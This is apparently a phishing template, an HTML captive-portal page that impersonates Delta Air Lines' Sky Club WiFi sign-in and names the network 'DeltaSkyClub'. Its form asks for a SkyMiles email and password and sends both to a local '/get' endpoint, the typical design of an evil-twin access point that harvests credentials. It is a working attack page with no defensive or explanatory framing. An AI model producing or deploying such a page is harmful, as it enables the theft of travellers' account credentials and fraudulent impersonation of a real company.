<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#003366;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.dlogo{text-align:center;margin-bottom:20px}
.dlogo h1{font-size:30px;font-weight:900;color:#fff;letter-spacing:1px}
.dlogo h1 span{color:#E31837}
.dlogo p{font-size:11px;color:rgba(255,255,255,0.6);letter-spacing:1.5px;text-transform:uppercase;margin-top:5px}
.card{background:#fff;width:100%;max-width:420px;border-radius:16px;overflow:hidden;box-shadow:0 16px 48px rgba(0,0,0,0.3)}
.ch{background:#E31837;padding:20px 24px;text-align:center}
.ch h1{font-size:16px;font-weight:700;color:#fff;letter-spacing:0.5px}.ch p{font-size:12px;color:rgba(255,255,255,0.8);margin-top:3px}
.cb{padding:26px 24px 22px}
.badge{display:flex;align-items:center;gap:10px;background:#f0f4ff;border:1px solid #c0d0f0;border-radius:8px;padding:10px 13px;margin-bottom:20px}
.dot{width:8px;height:8px;background:#4ade80;border-radius:50%;flex-shrink:0;box-shadow:0 0 0 3px rgba(74,222,128,0.2)}
.badge span{font-size:12.5px;color:#666}.badge strong{color:#1a1a1a;font-weight:600}
.lbl{display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.8px;color:#888;margin-bottom:6px;margin-top:14px}
input{width:100%;padding:12px 14px;border:1.5px solid #e0e0e0;border-radius:9px;font-size:15px;background:#fafafa;color:#1a1a1a}
input:focus{outline:none;border-color:#003366;box-shadow:0 0 0 3px rgba(0,51,102,0.1)}
input::placeholder{color:#c0c0c0}
.terms{font-size:11px;color:#aaa;line-height:1.5;margin-top:14px}.terms a{color:#003366}
.btn{width:100%;padding:13px;border:none;border-radius:9px;background:#003366;color:#fff;font-size:14px;font-weight:700;cursor:pointer;margin-top:14px}
.foot{background:#f5f7ff;border-top:1px solid #eee;padding:12px 24px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:11px;color:#aaa}.foot a{color:#003366;text-decoration:none}
</style>
</head>
<body>
<div class="dlogo"><h1><span>&#9651;</span> DELTA</h1><p>Sky Club &bull; Premium WiFi</p></div>
<div class="card">
  <div class="ch"><h1>Delta Sky Club WiFi</h1><p>SkyMiles member sign in</p></div>
  <div class="cb">
    <div class="badge"><div class="dot"></div><span>Network: <strong>DeltaSkyClub</strong></span></div>
    <form action="/get">
      <label class="lbl">SkyMiles Email</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <p class="terms">By connecting you agree to <a href="#">Delta's Terms of Use</a>.</p>
      <button type="submit" class="btn">Sign In &amp; Connect</button>
    </form>
  </div>
  <div class="foot"><span>&copy; Delta Air Lines</span><a href="#">Help</a></div>
</div>
</body>
</html>
